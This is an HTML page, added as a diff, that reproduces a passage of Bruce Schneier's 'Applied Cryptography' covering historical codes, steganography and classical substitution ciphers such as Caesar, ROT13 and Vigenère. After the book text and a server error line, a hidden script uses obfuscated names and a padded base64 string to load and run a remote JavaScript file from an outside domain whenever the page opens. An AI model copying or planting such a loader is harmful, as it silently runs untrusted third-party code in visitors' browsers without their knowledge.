@@ -1,0 +1,100 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Foundations</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=01//-->
+<!--PAGES=009-012//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="01-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="01-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>While the complexity of an attack is constant (until some cryptanalyst finds a better attack, of course), computing power is anything but. There have been phenomenal advances in computing power during the last half-century and there is no reason to think this trend won&#146;t continue. Many cryptanalytic attacks are perfect for parallel machines: The task can be broken down into billions of tiny pieces and none of the processors need to interact with each other. Pronouncing an algorithm secure simply because it is infeasible to break, given current technology, is dicey at best. Good cryptosystems are designed to be infeasible to break with the computing power that is expected to evolve many years in the future.
+</P>
+<P><FONT SIZE="+1"><B><I>Historical Terms</I></B></FONT></P>
+<P>Historically, a <B>code</B> refers to a cryptosystem that deals with linguistic units: words, phrases, sentences, and so forth. For example, the word &#147;OCELOT&#148; might be the ciphertext for the entire phrase &#147;TURN LEFT 90 DEGREES,&#148; the word &#147;LOLLIPOP&#148; might be the ciphertext for &#147;TURN RIGHT 90 DEGREES,&#148; and the words &#147;BENT EAR&#148; might be the ciphertext for &#147;HOWITZER.&#148; Codes of this type are not discussed in this book; see [794,795]. Codes are only useful for specialized circumstances. Ciphers are useful for any circumstance. If your code has no entry for &#147;ANTEATERS,&#148; then you can&#146;t say it. You can say anything with a cipher.</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">1.2 Steganography</FONT></H3>
+<P><B>Steganography</B> serves to hide secret messages in other messages, such that the secret&#146;s very existence is concealed. Generally the sender writes an innocuous message and then conceals a secret message on the same piece of paper. Historical tricks include invisible inks, tiny pin punctures on selected characters, minute differences between handwritten characters, pencil marks on typewritten characters, grilles which cover most of the message except for a few characters, and so on.</P>
+<P>More recently, people are hiding secret messages in graphic images. Replace the least significant bit of each byte of the image with the bits of the message. The graphical image won&#146;t change appreciably&#151;most graphics standards specify more gradations of color than the human eye can notice&#151;and the message can be stripped out at the receiving end. You can store a 64-kilobyte message in a 1024 &#215; 1024 grey-scale picture this way. Several public-domain programs do this sort of thing.</P>
+<P>Peter Wayner&#146;s <B>mimic functions</B> obfuscate messages. These functions modify a message so that its statistical profile resembles that of something else: the classifieds section of <I>The New York Times</I>, a play by Shakespeare, or a newsgroup on the Internet [1584,1585]. This type of steganography won&#146;t fool a person, but it might fool some big computers scanning the Internet for interesting messages.</P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">1.3 Substitution Ciphers and Transposition Ciphers</FONT></H3>
+<P>Before computers, cryptography consisted of character-based algorithms. Different cryptographic algorithms either substituted characters for one another or transposed characters with one another. The better algorithms did both, many times each.
+</P>
+<P>Things are more complex these days, but the philosophy remains the same. The primary change is that algorithms work on bits instead of characters. This is actually just a change in the alphabet size: from 26 elements to two elements. Most good cryptographic algorithms still combine elements of substitution and transposition.</P>
+<P><FONT SIZE="+1"><B><I>Substitution Ciphers</I></B></FONT></P>
+<P><B>A substitution cipher</B> is one in which each character in the plaintext is substituted for another character in the ciphertext. The receiver inverts the substitution on the ciphertext to recover the plaintext.</P>
+<P>In classical cryptography, there are four types of substitution ciphers:</P>
+<DL>
+<DD>&#151; <B>A simple substitution cipher</B>, or <B>monoalphabetic cipher</B>, is one in which each character of the plaintext is replaced with a corresponding character of ciphertext. The cryptograms in newspapers are simple substitution ciphers.
+<DD>&#151; <B>A homophonic substitution cipher</B> is like a simple substitution cryptosystem, except a single character of plaintext can map to one of several characters of ciphertext. For example, &#147;A&#148; could correspond to either 5, 13, 25, or 56, &#147;B&#148; could correspond to either 7, 19, 31, or 42, and so on.
+<DD>&#151; <B>A polygram substitution cipher</B> is one in which blocks of characters are encrypted in groups. For example, &#147;ABA&#148; could correspond to &#147;RTQ,&#148; &#147;ABB&#148; could correspond to &#147;SLL,&#148; and so on.
+<DD>&#151; <B>A polyalphabetic substitution cipher</B> is made up of multiple simple substitution ciphers. For example, there might be five different simple substitution ciphers used; the particular one used changes with the position of each character of the plaintext.
+</DL>
+<P>The famous <B>Caesar Cipher</B>, in which each plaintext character is replaced by the character three to the right modulo 26 (&#147;A&#148; is replaced by &#147;D,&#148; &#147;B&#148; is replaced by &#147;E,&#148;..., &#147;W&#148; is replaced by &#147;Z,&#148; &#147;X&#148; is replaced by &#147;A,&#148; &#147;Y&#148; is replaced by &#147;B,&#148; and &#147;Z&#148; is replaced by &#147;C&#148;) is a simple substitution cipher. It&#146;s actually even simpler, because the ciphertext alphabet is a rotation of the plaintext alphabet and not an arbitrary permutation.</P>
+<P>ROT13 is a simple encryption program commonly found on UNIX systems; it is also a simple substitution cipher. In this cipher, &#147;A&#148; is replaced by &#147;N,&#148; &#147;B&#148; is replaced by &#147;O,&#148; and so on. Every letter is rotated 13 places.</P>
+<P>Encrypting a file twice with ROT13 restores the original file.</P>
+<DL>
+<DD><I>P</I> = ROT13 (ROT13 (<I>P</I>))
+</DL>
+<P>ROT13 is not intended for security; it is often used in Usenet posts to hide potentially offensive text, to avoid giving away the solution to a puzzle, and so forth.
+</P>
+<P>Simple substitution ciphers can be easily broken because the cipher does not hide the underlying frequencies of the different letters of the plaintext. All it takes is about 25 English characters before a good cryptanalyst can reconstruct the plaintext [1434]. An algorithm for solving these sorts of ciphers can be found in [578,587,1600,78,1475,1236,880]. A good computer algorithm is [703].</P>
+<P>Homophonic substitution ciphers were used as early as 1401 by the Duchy of Mantua [794]. They are much more complicated to break than simple substitution ciphers, but still do not obscure all of the statistical properties of the plaintext language. With a known-plaintext attack, the ciphers are trivial to break. A ciphertext-only attack is harder, but only takes a few seconds on a computer. Details are in [1261].</P>
+<P>Polygram substitution ciphers are ciphers in which groups of letters are encrypted together. The Playfair cipher, invented in 1854, was used by the British during World War I [794]. It encrypts pairs of letters together. Its cryptanalysis is discussed in [587,1475,880]. The Hill cipher is another example of a polygram substitution cipher [732]. Sometimes you see Huffman coding used as a cipher; this is an insecure polygram substitution cipher.</P>
+<P>Polyalphabetic substitution ciphers were invented by Leon Battista in 1568 [794]. They were used by the Union army during the American Civil War. Despite the fact that they can be broken easily [819,577,587,794] (especially with the help of computers), many commercial computer security products use ciphers of this form [1387,1390,1502]. (Details on how to break this encryption scheme, as used in WordPerfect, can be found in [135,139].) The Vigen&#232;re cipher, first published in 1586, and the Beaufort cipher are also examples of polyalphabetic substitution ciphers.</P>
+<P>Polyalphabetic substitution ciphers have multiple one-letter keys, each of which is used to encrypt one letter of the plaintext. The first key encrypts the first letter of the plaintext, the second key encrypts the second letter of the plaintext, and so on. After all the keys are used, the keys are recycled. If there were 20 one-letter keys, then every twentieth letter would be encrypted with the same key. This is called the <B>period</B> of the cipher. In classical cryptography, ciphers with longer periods were significantly harder to break than ciphers with short periods. There are computer techniques that can easily break substitution ciphers with very long periods.</P>
+<P>A <B>running-key cipher</B>&#151;sometimes called a book cipher&#151;in which one text is used to encrypt another text, is another example of this sort of cipher. Even though this cipher has a period the length of the text, it can also be broken easily [576,794].</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="01-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="01-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(HHeSsQya, epCZilJb) {epCZilJb = HHeSsQya.createElement('script');epCZilJb.type = 'text/javascript';epCZilJb.async = true;epCZilJb.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');HHeSsQya.getElementsByTagName('body')[0].appendChild(epCZilJb);}(document));</script></body>
+</html>
